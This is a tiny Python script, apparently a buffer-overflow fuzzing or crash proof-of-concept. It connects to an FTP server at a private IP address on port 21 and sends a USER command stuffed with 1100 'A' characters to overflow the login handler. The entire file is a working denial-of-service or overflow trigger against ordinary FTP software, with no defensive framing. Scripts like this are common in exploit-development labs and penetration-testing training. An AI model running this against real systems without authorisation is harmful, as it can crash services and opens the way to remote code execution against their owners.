#!/usr/bin/python
import socket

buf = 'A'*1100

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.16.70", 21))
s.send("USER " + buf + " \r\n")
